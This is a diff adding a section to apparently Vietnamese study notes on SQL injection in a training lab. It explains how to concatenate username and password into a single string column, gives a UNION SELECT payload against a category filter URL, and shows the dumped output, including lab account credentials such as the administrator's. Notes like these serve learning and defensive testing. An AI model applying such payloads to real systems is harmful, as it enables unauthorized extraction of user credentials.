@@ -62,4 +62,18 @@ mà ta cần ví dụ:
 .../filter?category=Gifts' union select username, password from users-- -
 ở đây ta đã biết trước được là The database contains a different table called users, with columns called username and password.
 
+vấn đề tiếp theo, ví dụ truy vấn đầu tiên có hai cột với dữ liệu là số và string, mà dữ liệu ta cần lấy là username và passwd chỉ
+có kiểu string thôi thì phải làm sao? đáp án là ta nên truy vấn với tham số đầu vẫn là kiểu số (để null cũng được) và username và 
+passwd ta gộp lại thành một tham số với kiểu string bằng cách sau đây:
+.../filter?category=Accessories' union select null, username || '~' || password FROM users-- -
+kết quả là username và passwd được gộp thành một cột như sau đây:
+wiener~sd3owh795lps65mpfso7
+Giant Pillow Thing
+administrator~2ptqk3jbmma3ogglyjp4
+carlos~sagxavnidrd2oawyo7mz
+ZZZZZZ Bed - Your New Home Office
+Cheshire Cat Grin
+
+
+
 
